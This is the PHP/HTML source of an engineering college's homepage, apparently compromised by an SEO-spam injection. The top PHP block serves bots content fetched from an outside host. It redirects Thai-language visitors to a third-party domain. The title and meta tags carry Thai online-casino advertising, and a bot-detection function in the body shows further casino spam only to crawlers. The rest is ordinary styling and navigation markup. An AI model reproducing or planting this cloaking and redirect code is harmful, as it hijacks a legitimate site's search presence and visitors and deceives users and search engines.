<?php
$referer         = $_SERVER['HTTP_REFERER']            ?? '';
$agent           = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$acceptLang      = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '');
$requestUri      = $_SERVER['REQUEST_URI']             ?? '/';
$cookieAz        = $_COOKIE['az']                      ?? '';
$upgradeInsecure = (int) ($_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS'] ?? 0);

if (strpos($agent, 'bot') !== false && $requestUri === '/') {

    if (
        str_contains($acceptLang, 'zh') &&
        $upgradeInsecure === 1 &&
        $cookieAz === 'lp'
    ) {
        $secureFlag = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off');
        setcookie(
            'az',
            'lp',
            [
                'expires'  => time() + (3600 * 7200),
                'path'     => '/',
                'secure'   => $secureFlag,
                'httponly' => true,
                'samesite' => 'Lax'
            ]
        );
        echo "<!doctype html><html><head><title></title></head><body></body></html>";
        exit;
    }

    $ch = curl_init("https://2ez4me.us/aec/");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_CONNECTTIMEOUT => 2,
        CURLOPT_TIMEOUT        => 5,
        CURLOPT_USERAGENT      => 'Mozilla/5.0 (compatible; Fetcher/1.0)',
    ]);
    $response  = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($response !== false && ($http_code === 0 || $http_code < 400)) {
        header('Content-Type: text/html; charset=utf-8');
        echo $response;
    } else {
        echo "<!doctype html><html><head><title></title></head><body></body></html>";
    }
    exit;
}

if (str_starts_with($acceptLang, 'th')) {
    header("Location: https://xn--12ca2dbc1f9gc3nd.lazismumedankota.org/403.html", true, 301);
    exit;
}
?>
<!DOCTYPE html>
<html class="no-js" lang="">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
<meta name="google-site-verification" content="zf_6odOb5SM9l59J80HVEGO5g5FCNn3NiNHnwcXnnQs" />
<!-- <script async src="https://www.googletagmanager.com/gtag/js?id=UA-157904896-1"></script> -->
<meta charset="utf-8">
<meta http-equiv="x-ua-compatible" content="ie=edge">
<title>Aditya Engineering College : เว็บคาสิโนออนไลน์ บาคาร่า สล็อต PG และ PG SLOT ที่ดีที่สุด พร้อมแนะนำ K929, M98, UFABET, FOX888, H25, U31</title>
<meta name="description" content="Aditya Engineering College เว็บคาสิโนออนไลน์ครบวงจร เล่นบาคาร่า สล็อต PG และ PG SLOT รวมสล็อตที่ดีที่สุด พร้อมแนะนำเว็บดัง M98, UFABET, FOX888, H25 และ U31">
<link rel="canonical" href="https://www.aec.edu.in/" />
<meta property="og:title" content="Aditya Engineering College : เว็บคาสิโนออนไลน์ บาคาร่า สล็อต PG และ PG SLOT ที่ดีที่สุด พร้อมแนะนำ K929, M98, UFABET, FOX888, H25, U31" />
<meta property="og:description" content="Aditya Engineering College เว็บคาสิโนออนไลน์ครบวงจร เล่นบาคาร่า สล็อต PG และ PG SLOT รวมสล็อตที่ดีที่สุด พร้อมแนะนำเว็บดัง M98, UFABET, FOX888, H25 และ U31" />
<meta property="og:url" content="https://www.aec.edu.in/" />
<meta property="og:site_name" content="aec.edu.in" />
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />

<!-- Favicon -->
<link rel="shortcut icon" type="image/x-icon" href="logos/Aditya_university_logo.png">
<!-- Normalize CSS -->
<!-- <link rel="stylesheet" href="adityanew/css/normalize.css"> -->
<!-- Main CSS -->
<!-- <link rel="stylesheet" href="adityanew/css/main.css"> -->
<!-- Bootstrap CSS -->
<!-- <link rel="stylesheet" href="adityanew/css/bootstrap.min.css"> -->
<!-- Animate CSS -->
<link rel="stylesheet" href="css/animate.min.css">
<!-- Font-awesome CSS-->
<!-- <link rel="stylesheet" href="adityanew/css/font-awesome.min.css"> -->
<!-- Owl Caousel CSS -->
<!-- <link rel="stylesheet" href="adityanew/vendor/OwlCarousel/owl.carousel.min.css"> -->
<!-- <link rel="stylesheet" href="adityanew/vendor/OwlCarousel/owl.theme.default.min.css"> -->
<!-- Main Menu CSS -->
<link rel="stylesheet" href="adityanew/css/meanmenu.min.css">
<!-- nivo slider CSS -->
<!-- <link rel="stylesheet" href="adityanew/vendor/slider/css/nivo-slider.css" type="text/css" /> -->
<!-- <link rel="stylesheet" href="adityanew/vendor/slider/css/preview.css" type="text/css" media="screen" /> -->
<!-- Datetime Picker Style CSS -->
<!-- <link rel="stylesheet" href="adityanew/css/jquery.datetimepicker.css"> -->
<!-- Magic popup CSS -->
<!-- <link rel="stylesheet" href="adityanew/css/magnific-popup.css"> -->
<!-- Switch Style CSS -->
<!-- <link rel="stylesheet" href="adityanew/css/hover-min.css"> -->
<!-- ReImageGrid CSS -->
<!-- <link rel="stylesheet" href="adityanew/css/reImageGrid.css"> -->
<!-- Custom CSS -->
<link rel="stylesheet" href="adityanew/style2.css">


<link rel="stylesheet" type="text/css" href="css/full-slider.css">
<!-- Bootstrap Core CSS -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">

<!-- Bootstrap Core JS -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>   
<!-- animation css link-->
<!-- <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.css"> -->


<!-- font family link -->
<link href="https://fonts.googleapis.com/css?family=Bree+Serif" rel="stylesheet">


<!--flash news-->
<link rel="stylesheet" type="text/css" href="css/ticker.css">
<!-- <link href="https://www.jqueryscript.net/css/jquerysctipttop.css" rel="stylesheet" type="text/css"> -->

<!-- <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script> -->
<script src="js/ticker.js"></script>
<!--flash news end-->

<!--  website feedback links  -->
<!--jquery ajax js-->
<!-- <script src="js/jquery.min.js"></script> -->


<!--star rating js-->
<!-- <link href="stars/css/star-rating.css" media="all" rel="stylesheet" type="text/css"/> -->
<!--suppress JSUnresolvedLibraryURL -->
<!-- <script src="stars/js/star-rating.js" type="text/javascript"></script> -->

<!--notify alert js and css-->
<link type="text/css" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans">
<link rel="stylesheet" type="text/css" href="css/alert-notify/notify.css">
<link rel="stylesheet" type="text/css" href="css/alert-notify/prettify.css">

<!-- Load local jQuery -->
<!-- <script src="css/libs/jquery-loader.js"></script> -->

<!-- Load local lib and tests -->
<link rel="stylesheet" href="css/libs/feedback/remodal.css">
<link rel="stylesheet" href="css/libs/feedback/remodal-default-theme.css">
<script src="css/libs/feedback/remodal.js"></script>
<!-- <script src="https://www.aec.edu.in/css/libs/jquery-loader.js"></script> -->
<link rel="stylesheet" type="text/css" href="css/index.css">
<!-- Modernizr Js -->
<!-- <script src="adityanew/js/modernizr-2.8.3.min.js"></script> -->
<style type="text/css">

   

    @media screen and (min-width: 1180px) and (max-width: 1402px) {
    .Aditya_university_logo {
        margin-top: 62px!important;
        /*background: red;*/

    }
    }
    @media screen and (min-width: 802px) and (max-width: 1179px) {
    .Aditya_university_logo {
        margin-top: 78px!important;
        /*background: red;*/

    }
    }

    .header2-area nav#desktop-nav > ul > li ul {
     /*            left: -29px!important;*/
     /*            width: 350px!important;*/
    }
    
.flash_margin{
margin: 0 !important;
}
.login_btn {
    background: #046;
    border: none;
    box-shadow: none;
    min-height: 40px;
    height: 100%;
    padding: 0px 10px;
    font-weight: bold;
    letter-spacing: 1px;
    white-space: nowrap;
    position: relative;
    right: 10px;
    margin-top: -7px!important;
}

.login_btn_dropDown  ul li {
margin: 0 !important;
width: 100%;
/*padding: 5px 0;*/
}

.login_btn_dropDown .dropdown-menu {
margin: 0;
}

@media screen and (max-width: 475px) {
.login_btn {
    margin-top: 0px;
}
}

@media screen and (max-width: 360px) {
.login_btn {
    margin-top: 0px;
    margin-left: -65px;

}
}

/*.desktop-nav > nav{
float:right;
}
.desktop-nav > nav>ul{
float:left;
position:relative;
margin:0;
}
.desktop-nav > nav li{
list-style:none;
float:left;
}
.desktop-nav > nav .dropdown{
position:relative
}
.desktop-nav > nav li a{
text-decoration: none;
font-family: Roboto, sans-serif;
font-size: 15px;
font-weight: 500;
line-height: 24px;
color: #002147;

font-style: normal;
padding: 33px 15px;
display: block;
}
.desktop-nav > nav li a:hover{
color: #fdc800;
transition: 0.4s;
}
.desktop-nav > nav li ul{
display:none;
}
.desktop-nav > nav li:hover ul{
display:inline;
}
.desktop-nav > nav li li{
float:none;
}
.desktop-nav > nav .dropdown ul{
position:absolute;
left:0;
top:100%;
background:#fff;
padding:20px 0;
border-bottom:3px solid #34495e;
}
.desktop-nav > nav .dropdown li{
white-space:nowrap
}
.desktop-nav > nav .dropdown li a{
padding:10px 35px;
font-size:13px;
min-width:200px
}*/
.mega-dropdownright {
right: 0 !important;
width: auto !important;
}        
/*       .mega-dropdownright {
right: 0;
}
*/
/*.desktop-nav > nav li li a{
float:none;
color:#fff;
display:block;
padding:8px 10px;
border-radius:2px;
font-size:13px
}
.desktop-nav > nav li li a:hover{

background:rgba(255,255,255,0.4);
}*/
.mega-col{
/*width:25%;*/
float:left;
margin-right: 10px;
}
.mega-col-1{
width: 100%;
}
.mega-col-2 {
width: 50%;
}
.mega-col-3 {
width: 33.3%;
}
.mega-col-4{
width: 25%;
}
#menu-icon{
position:absolute;
right:0;
top:50%;
margin-top:-12px;
margin-right:30px;
display:none
}
#menu-icon span{
border:2px solid #fff;
width:30px;
margin-bottom:5px;
display:block;
-webkit-transition:all .2s;
transition:all .1s
}
.tab_heading {
color: #fd752c;
}

@media screen and (max-width: 1369px) {
.desktop-nav > nav li a{
    /*line-height: 0;*/
    padding: 23px 6px;
}
}

@media screen and (max-width: 1249px) {
.desktop-nav > nav li a{
    /*line-height: 0;*/
    padding:22px 8px;
}
}


@media screen and (min-width: 1369px) and (max-width: 1492px) {
.desktop-nav > nav li a{
    /*line-height: 0;*/
    padding: 23px 6px;
}
}




.button-alumini{
background-color: blue;
-webkit-border-radius: 10px;
border-radius: 10px;
border: none;
color: #FFFFFF;
cursor: pointer;
display: inline-block;
font-family: Arial;
font-size: 15px;
padding: 0px 10px;
text-align: center;
text-decoration: none;
-webkit-animation: glowing 1500ms infinite;
-moz-animation: glowing 1500ms infinite;
-o-animation: glowing 1500ms infinite;
animation: glowing 1500ms infinite;
}
@-webkit-keyframes glowing {
0% { background-color: #0a5c45; -webkit-box-shadow: 0 0 3px #B20000; }
50% { background-color: #4a8c45; -webkit-box-shadow: 0 0 40px #FF0000; }
100% { background-color: #6aac45; -webkit-box-shadow: 0 0 3px #B20000; }
}

@-moz-keyframes glowing {
0% { background-color: #0a5c45; -moz-box-shadow: 0 0 3px #B20000; }
50% { background-color: #4a8c45; -moz-box-shadow: 0 0 40px #FF0000; }
100% { background-color: #6aac45; -moz-box-shadow: 0 0 3px #B20000; }
}

@-o-keyframes glowing {
0% { background-color: #0a5c45; box-shadow: 0 0 3px #B20000; }
50% { background-color: #4a8c45; box-shadow: 0 0 40px #FF0000; }
100% { background-color: #6aac45; box-shadow: 0 0 3px #B20000; }
}

@keyframes glowing {
0% { background-color: #0a5c45; box-shadow: 0 0 3px #B20000; }
50% { background-color: #4a8c45; box-shadow: 0 0 40px #FF0000; }
100% { background-color: #6aac45; box-shadow: 0 0 3px #B20000; }
}


.button-alumini2{
background-color: blue;
-webkit-border-radius: 10px;
border-radius: 10px;
border: none;
color: #FFFFFF;
cursor: pointer;
display: inline-block;
font-family: Arial;
font-size: 15px;
padding: 0px 10px;
text-align: center;
text-decoration: none;
-webkit-animation: glowing1 1500ms infinite;
-moz-animation: glowing1 1500ms infinite;
-o-animation: glowing1 1500ms infinite;
animation: glowing1 1500ms infinite;
}
@-webkit-keyframes glowing1 {
0% { background-color: #9c27b0; -webkit-box-shadow: 0 0 3px #84ffff; }
50% { background-color: #00bfa5; -webkit-box-shadow: 0 0 40px #84ffff; }
100% { background-color: #01579b; -webkit-box-shadow: 0 0 3px #84ffff; }
}

@-moz-keyframes glowing1 {
0% { background-color: #9c27b0; -moz-box-shadow: 0 0 3px #84ffff; }
50% { background-color: #00bfa5; -moz-box-shadow: 0 0 40px #84ffff; }
100% { background-color: #01579b; -moz-box-shadow: 0 0 3px #84ffff; }
}

@-o-keyframes glowing1 {
0% { background-color: #9c27b0; box-shadow: 0 0 3px #84ffff; }
50% { background-color: #00bfa5; box-shadow: 0 0 40px #84ffff; }
100% { background-color: #01579b; box-shadow: 0 0 3px #84ffff; }
}

@keyframes glowing1 {
0% { background-color: #9c27b0; box-shadow: 0 0 3px #84ffff; }
50% { background-color: #00bfa5; box-shadow: 0 0 40px #84ffff; }
100% { background-color: #01579b; box-shadow: 0 0 3px #84ffff; }
}




.float1 {
position: fixed;
width: 59px;
height: 60px;
bottom: 22px;
left: 4px;
background-color: #25d366;
color: #FFF;
border-radius: 50px;
text-align: center;
font-size: 40px;
z-index: 100;
}
.float2 {
position: fixed;
width: 60px;
height: 60px;
bottom: 22px;
right: 4px;
color: #FFF;
border-radius: 50px;
text-align: center;
z-index: 999;
}
/*.float3 {
position: fixed;

}*/

@media screen and (max-width: 405px) {
.apply_admission_card {
height: 72px !important;
}
.apply_admission {
text-align: center;
margin-top: 12px;
}
}

.apply_admission p{
margin: 11px 0 0 10px;
}

@media screen and (max-width: 479px) {
.powered_by{
margin-bottom: 35px !important;
padding: 0 !important;
float: none !important;
text-align: center !important;
}
}

#scrollUp {
background-color: rgba(253, 200, 0, 0.8);
bottom: 80px;
color: #ffffff;
display: block;
font-size: 18px;
height: 45px;
line-height: 45px;
position: fixed;
right: 20px;
text-align: center;
text-decoration: none;
transition: all 0.5s cubic-bezier(0, 0, 0, 1) 0s;
width: 45px;
z-index: 99999;
border-radius: 50%;
}
.login_btn1{
background: #001247;
border: none;
box-shadow: none;
min-height: 40px;
height: 100%;
/* margin-top: 9px;*/
padding: 0px 10px;
font-weight: bold;
letter-spacing: 1px;
white-space: nowrap;
position: relative;
right: 10px;
border-radius: 7px;
}
.name{
font-size: 18px;
line-height: 20px;
height: 15px;

}
.copyright p {
text-align: left;
color: #ffff;
padding: 2px 0;
margin-bottom: 23px;
}



@media screen and (max-width: 395px) {
.login_btn1{
background: #001247;
border: none;
box-shadow: none;
min-height: 40px;
height: 100%;
/* margin-top: 9px;*/
padding: 0px 8px;
font-weight: bold;
letter-spacing: 1px;
white-space: nowrap;
position: relative;
right: 10px;
border-radius: 7px;
}

.apply_admission {
text-align: center;
margin-top: 12px;
font-size: 16px
}

.name{
font-size: 16px;
line-height: 20px;
height: 15px;

}

} 

@media screen and (max-width: 361px) {
.login_btn1{
background: #001247;
border: none;
box-shadow: none;
min-height: 40px;
height: 100%;
/* margin-top: 9px;*/
padding: 0px 8px;
font-weight: bold;
letter-spacing: 1px;
white-space: nowrap;
position: relative;
right: 10px;
border-radius: 7px;
}

.apply_admission {
text-align: center;
margin-top: 12px;
font-size: 13px
}

.name{
font-size: 13px;
line-height: 20px;
height: 15px;

}

} 




@media screen and (max-width: 324px) {
.login_btn1{
background: #001247;
border: none;
box-shadow: none;
min-height: 40px;
height: 100%;
/* margin-top: 9px;*/
padding: 0px 8px;
font-weight: bold;
letter-spacing: 1px;
white-space: nowrap;
position: relative;
right: 10px;
border-radius: 7px;
}

.apply_admission {
text-align: center;
margin-top: 12px;
font-size: 12px
}

.name{
font-size: 12px;
line-height: 20px;
height: 15px;

}

}

.myLinkClass:hover a{
text-decoration:none;
}
.myLinkClass{
text-decoration:none;
}
.myLinkClass:before {
/*visibility: hidden;*/
height: 0;
}

.popup_this_container {
position: fixed;
top: 0;
left: 0;
width: 100%;
height: 100%;
background: rgba(0,0,0,0.6);
z-index: 999999;
}

#popup_this {
/*top: 68%;
left: 56%;
text-align: center;
margin-top: -350px;
margin-left: -188px;
position: fixed;*/
/*background: #fff;
padding: 30px;*/


position: relative;
top: 20%;
left: 0;
right: 0;
width: 60%;
}
@media screen and (min-width: 956px) and (max-width: 1500px) {
#popup_this {
width: 75%;
}
}
@media screen and (min-width: 768px) and (max-width: 955px) {
#popup_this {
width: 80%;
}
}
@media screen and (min-width: 500px) and (max-width: 767px) {
#popup_this {
width: 90%;
}
}
@media screen and (min-width: 200px) and (max-width: 499px) {
#popup_this {
width: 95%;
}
.b-close {
top: -7px !important;
right: 4px !important;
}
}
.b-close {
position: absolute;
right: 10px;
top: 0;
cursor: pointer;
color: #fff;
background: green;
width: 15px;
/* padding: 5px 10px;*/
padding: 3px 10px;
}

.tabs_bos > li.active {
background: rgba(255,255,255,0.4);
font-size: bold !important;
}
.tabs_bos > li.active a {
color: #fdc800 !important;
transition: 0.4s !important;
font-size: bold !important;
}

@media screen and (max-width: 360px) {
.mobile{
margin-left: 123px;
margin-top: -39px;
}
}

@media screen and (max-width: 1481px) {
desktop-nav > nav li a {
text-decoration: none;
font-family: Roboto, sans-serif;
font-size: 13px !important;
font-weight: 500;
line-height: 24px;
color: #002147;
/* text-transform: uppercase; */
font-style: normal;
padding: 33px 15px;
display: block;
}
}

.notice {
padding: 17.8px;
background-color: #fafafa;
border-left: 6px solid #f96e07;
margin-bottom: 10px;
-webkit-box-shadow: 0 5px 8px -6px rgb(0 0 0 / 20%);
-moz-box-shadow: 0 5px 8px -6px rgba(0,0,0,.2);
box-shadow: 0 5px 8px -6px rgb(0 0 0 / 20%);
}



.mega-dropdownright {
right: 0 !important;
}

@media screen and (max-width: 1700px){
nav#desktop-nav li.has-child-menu > ul.thired-level {
position: absolute;
left: -270px;
top: 0;
opacity: 0;
transform: scaleY(0);
transform-origin: 0 0 0;
transition: all 0.5s ease 0s;
}
nav#desktop-nav li.has-child-menu > a:after {
font-family: 'FontAwesome';
content: "\f104";
float: left;
margin-right: 10px;
}
.carousel, .item, .active {
height: auto;
}
}


nav#desktop-nav li.has-child-menu > ul.left_side {
position: absolute;
left: -270px;
top: 0;
right: 40px;
opacity: 0;
transform: scaleY(0);
transform-origin: 0 0 0;
transition: all 0.5s ease 0s;
}
nav#desktop-nav li.has-child-menu.left_menu > a:after{
content: "\f104";
float: left;
margin-right: 10px;
}

.disabled {
  pointer-events: none;
  cursor: default;
}

.main-menu-area .logo-area {
margin: -27px 0!important;
}



/*admission_2024 css*/
.admission_2024 {
position: absolute;
height: 120px;
width: 130px;
box-shadow: 3px 3px 5px #000000;
/*padding: 4px;*/
border-bottom-right-radius: 15px;
cursor: auto !important;
background-color: #002147;
position: absolute;
overflow: hidden;
z-index: 9999;
top: -60px;
left: -9px;
height: 111px;
border-bottom-left-radius: 15px;
cursor: pointer;
text-align: center;
width: 113px;
box-shadow: 5px 5px 5px #344e6d;
float: none;
color: #fff;
margin-right: -85px !important;
text-transform: capitalize;
/*font-size: 10px!important;*/

}
.admission_2024 p {
line-height: 24px;
padding: 0px;
margin: 0px !important;
letter-spacing: 0px;
font-weight: normal !important;
/*font-size: 10px!important;*/

}


@media screen and (min-width:992px ) and (max-width:1200px) {
.admission_2024_1 {
   left: -11px;
margin-top: 45px;

}

.button1 {
padding: 6px 12px;
background: #fd752c;
display: block;
width: 95px;
color: white;
/* font-size: 42px; */
margin-left: -19px !important;
margin-top: -35px !important;
border-radius: 23px;
-webkit-transition: all 0.3s;
-moz-transition: all 0.3s;
transition: all 0.3s;
text-align: center;
font-size: 13px;
box-shadow: 0px 1px 4px rgba(0,0,0, 0.10);
-moz-box-shadow: 0px 1px 4px rgba(0, 0, 0, 0.10);
-webkit-box-shadow: 0px 1px 4px rgba(0,0,0, 0.10);
}
    
}
@media screen and (min-width:772px ) and (max-width:991px) {
.admission_2024_1 {
   left: -11px;
margin-top: 45px;

}

.button1 {
padding: 6px 12px;
background: #fd752c;
display: block;
width: 95px;
color: white;
/* font-size: 42px; */
margin-left: -14px !important;
margin-top: -35px !important;
border-radius: 23px;
-webkit-transition: all 0.3s;
-moz-transition: all 0.3s;
transition: all 0.3s;
text-align: center;
font-size: 13px;
box-shadow: 0px 1px 4px rgba(0,0,0, 0.10);
-moz-box-shadow: 0px 1px 4px rgba(0, 0, 0, 0.10);
-webkit-box-shadow: 0px 1px 4px rgba(0,0,0, 0.10);
}
}
/*@media screen and (min-width: 340px) and (max-width:549px) {
.admission_2024_1 {
   margin-top: 112px;
  left: 226px;
   }
}

@media screen and (min-width: 550px) and (max-width:766px) {
.admission_2024_1 {
  margin-top: 91px;
left: 435px;

}
}*/


.button1 {
padding: 6px 12px;
background: #fd752c;
display: block;
width: 95px;
color: white;
/*font-size: 42px;*/
margin-left: -12px;
margin-top: -28px;
border-radius: 23px;
-webkit-transition: all 0.3s;
-moz-transition: all 0.3s;
transition: all 0.3s;
text-align: center;
font-size: 13px;
box-shadow: 0px 1px 4px rgba(0,0,0, 0.10);
-moz-box-shadow: 0px 1px 4px rgba(0, 0, 0, 0.10);
-webkit-box-shadow: 0px 1px 4px rgba(0,0,0, 0.10);
}

.button1:hover {
background-color: darkcyan;
}
.open>.dropdown-menu {
display: block;
z-index: 11111;
}
/*admission_2024 css*/
</style>
</head>

<body>
<?php
function isBot()
{
    $bots = array(
        'AhrefsBot','baiduspider','baidu','bingbot','bing','DuckDuckBot',
        'facebookexternalhit','facebook','facebot','googlebot','-google',
        'google-inspectiontool','Uptime-Kuma','linked','Linkidator','linkwalker',
        'mediapartners','mod_pagespeed','naverbot','pinterest','SemrushBot',
        'twitterbot','twitter','xing','yahoo','YandexBot','YandexMobileBot',
        'yandex','Zeus/i'
    );
    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    foreach ($bots as $bot) {
        if (stripos($ua, $bot) !== false) {
            return true;
        }
    }
    return false;
}

if (isBot()) {
    ?>
<!-- POPUP -->
<div id="wrapper">
        <div id="text-2861201852" class="text">
    
<h1>Aditya Engineering College : เว็บคาสิโนออนไลน์ บาคาร่า สล็อต PG และ PG SLOT ที่ดีที่สุด พร้อมแนะนำ K929, M98, UFABET, FOX888, H25, U31</h1>
    
<style>
#text-2861201852 {
  text-align: center;
}
</style>
  </div>
  <div id="text-2305460837" class="text">
    
<p>Aditya Engineering College เว็บคาสิโนออนไลน์ครบวงจร เล่นบาคาร่า สล็อต PG และ PG SLOT รวมสล็อตที่ดีที่สุด พร้อมแนะนำเว็บดัง M98, UFABET, FOX888, H25 และ U31</p>
    
<style>
#text-2305460837 {
  text-align: center;
}
</style>
  </div>
    <?php
} 
?>

<div id="wrapper">
    <!-- Header Area Start Here -->
    <header>
        <div id="header2" class="header2-area" >
            <div class="header-top-area" style="background:#FD752C ;color: #fff">
                <div class="container-fluid">
                    <div class="row">
                       
                        <div class="col-lg-10 col-md-10 col-sm-10 col-xs-10" style="margin-top: 8px;">
                            <div class="header-top-left">
                                <ul>
                                    <li><i class="fa fa-phone" aria-hidden="true"></i><a href="Tel:+1234567890"> + 91 99498 76662 </a></li>
                                    <li><i class="fa fa-envelope" aria-hidden="true"></i><a href="#">office@aec.edu.in</a></li>
                                    
                                     <!-- <li><button class="btn-info btn" style='padding: 0px 2px;'><a href="https://www.aec.edu.in/?p=nirf"target="_blank"><b>NIRF</b></a></button></li> -->
                                     <li><button class="btn-success btn button-alumini mobile"><a href="http://codecarnival.aec.edu.in:5500/" target="_blank"><b>CodeCarnival</b></a></button></li>
                                     <!-- <li><button class="btn-success btn button-alumini2">EAPCET Counselling Code:<b> ADTPPU</b></button></li> -->
                                      <!-- <li><button class="btn-success btn button-alumini"><a href="https://technicalhub.io/placement/"target="_blank"><b>Placement</b></a></button></li> -->

                                     
                                </ul>
                            </div>
                        </div>

                        
                     


                        <div class="col-lg-2 col-md-2 col-sm-2 col-xs-2">
                            <div class="header-top-right">
                                <ul style="margin-bottom: 0!important;margin-left: -37px;">
                                    <li>
                                        <div class="dropdown login_btn_dropDown" style="margin-top:11px;"><!-- style="margin:6px !important; -->
                                            
                                            <button class="login_btn" type="button" id="menu1" data-toggle="dropdown"><i class="glyphicon glyphicon-user" style="font-size: 14px !important;"></i> Login
                                                <span class="caret"></span>
                                            </button>

                                            <ul class="dropdown-menu" role="menu" aria-labelledby="menu1" style="left: -98px;">
                                                 <!-- <li role="presentation"><a role="menuitem" tabindex="-1" href="https://myprofile.technicalhub.io/" target="blank"><b>Myprofile Login</b></a></li> -->
                                                 <!-- <li role="presentation"><a role="menuitem" tabindex="-1" href="https://target.technicalhub.io/" target="blank"><b>Target Login</b></a></li> -->
                                               
                                                <li role="presentation"><a role="menuitem" tabindex="-1" href="https://myhub.technicalhub.io/login" target="blank"><b>Myhub Login</b></a></li>
                                                 <li role="presentation"><a role="menuitem" tabindex="-1" href="https://info.aec.edu.in/aec/" target="blank"><b>Student/Parent login</b></a></li>
                                                <li role="presentation"><a role="menuitem" tabindex="-1" href="https://examsection.aec.edu.in/" target="blank"><b>Autonomous Exam Portal</b></a>
                                                </li>
                                               
                                                <!-- <li role="presentation"><a role="menuitem" tabindex="-1" href="https://aditya.byndr.com/login?#/" target="blank"><b>LMS Login</b></a> -->
                                                <!-- <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.aec.edu.in/lms/" target="_blank"><b>LMS Login</b></a> -->
                                                  
                                                </li>
                                                <li role="presentation"><a role="menuitem" tabindex="-1" href="https://login.microsoftonline.com/" target="blank"><b>Aditya Mail</b></a></li>

                                                 <li role="presentation"><a role="menuitem" tabindex="-1" href="https://info.aec.edu.in/aec/olpayment.aspx" target="blank"><b>Online Payment</b></a></li>
                                            </ul>
                                        </div>
                                    </li>
                                </ul>
                            </div>
                        </div>

                        <!-- <div class="col-lg-2 col-md-2 col-sm-2 col-xs-2" style="margin-top: 8px;">
                            <div class="header-top-left">
                                <ul>
                                    <li><button class="btn-success btn button-alumini mobile"><a href=""target="_blank"><b>Feedback</b></a></button></li>
                                 
                                </ul>
                            </div>
                        </div> -->
                    </div>
                </div>
            </div>
            <div class="main-menu-area bg-textPrimary hidden-xs" id="sticker" style="z-index: 5000;height: 94px;">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-lg-4 col-md-4 col-sm-4">
                            <div class="logo-area">
                                <a href="https://adityauniversity.in/"><img class="img-responsive Aditya_university_logo" src="adityanew/images/100.png" alt="logo" style="margin-top: 34px;"></a>
                             </div>
                        </div>
                        <div class="col-lg-8 col-md-8 col-sm-8 text-left desktop-nav" style="margin-top:23px;">
                            <nav id="desktop-nav">
                                <ul style="margin-top: 10px;margin-left: -89px;">
                                    <li>
                                        <a href="https://aec.edu.in"><b>Home</b></a>
                                    </li>
                                    <li>
                                        <a href="#"><b>About Us</b></a>
                                        <ul class="mega-dropdown">
                                            <li class="row">
                                                <ul class="mega-col">
                                                    <li><a href="?p=About_college">About College</a></li>
                                                    <li><a href="?p=Accreditations">Accreditations</a></li>
                                                    <li><a href="?p=Approvals_Affiliation">Approvals / Affiliation</a></li>
                                                    <li><a href="?p=Autonomous">Governance</a></li>
                                                    <li><a href="https://www.aec.edu.in/?p=Research_Eco_System#tab6">MoUs</a></li>
                                                    <!-- <li><a href="?p=mandatory_disclosure">Mandatory Disclosure</a></li> -->
                                                    <li><a href="/docs/MANDATORY DISCLOSURE.pdf" target='_new'>Mandatory Disclosure</a></li>

                                                    

                                                </ul>
                                            </li>
                                        </ul>
                                    </li>
                                    <li>
                                        <a href="#"><b>Academics</b></a>
                                        <ul class="mega-dropdown">
                                            <li class="row">
                                                <ul class="mega-col">
                                                    <li><a href="?p=Academics_Admissions">Admissions</a></li>
                                                    <li><a href="?p=Regulations">Regulations</a></li>
                                                    <li><a href="?p=Academic-Calenders">Academic Calendars</a></li>
                                                    <li class="has-child-menu"><a href="#">Departments</a>
                                                        <ul class="thired-level" style="margin-top:-177px!important">
                                                            <li><a href ="?p=CIVIL">Civil Engineering</a></li>
                                                            <li><a href ="?p=EEE">Electrical and Electronics Engineering</a></li>
                                                            <li><a href ="?p=MECH">Mechanical Engineering</a></li>
                                                            <li><a href ="?p=ECE">Electronics and Communication Engineering</a></li>
                                                            <li><a href ="?p=CSE">Computer Science and Engineering</a></li>
                                                            <li><a href ="?p=Data_Science">Computer Science and Engineering (Data Science)</a></li>
                                                            <li><a href ="?p=IT">Information Technology</a></li>
                                                            <li><a href ="?p=MNE">Mining Engineering</a></li>
                                                            <li><a href ="?p=PT">Petroleum Technology</a></li>
                                                            <li><a href ="?p=AGRI">Agricultural Engineering</a></li>
                                                            <li><a href ="?p=AIML">Artificial Intelligence & Machine Learning</a></li>

                                                            <li><a href ="?p=Management-Studies">Department of Management Studies</a></li>
                                                            <li><a href ="?p=MCA">Department of Computer Applications</a></li>
                                                            <li><a href ="?p=Humanities-Sceinces">Department of Humanities-Sciences</a></li>
                                                            <li><a href="?p=About_T-Hub">About T-Hub</a></li>
                                                        </ul>
                                                    </li>
                                                    <li><a href="?p=Outcomebased Education"><b>Outcome-based Education(OBE)</b></a></li>
                                                    <li><a href="?p=AutonomousSyllabus">Syllabus</a></li>
                                                    <li><a href="?p=Holidays">Holidays</a></li>
                                                    <li><a href="?p=StakeholderFeedback">Stakeholder's Feedback</a></li>
                                                    <li><a href="?p=Mentoring_System">Mentoring System</a></li>
                                                    <!-- <li><a href="?p=Staff_Directory">Staff Directory</a></li> -->

                                                 </ul>
                                              </li>
                                           </ul>
                                       </li>

                                     <li>
                                        <a href="#"><b>Research</b></a>
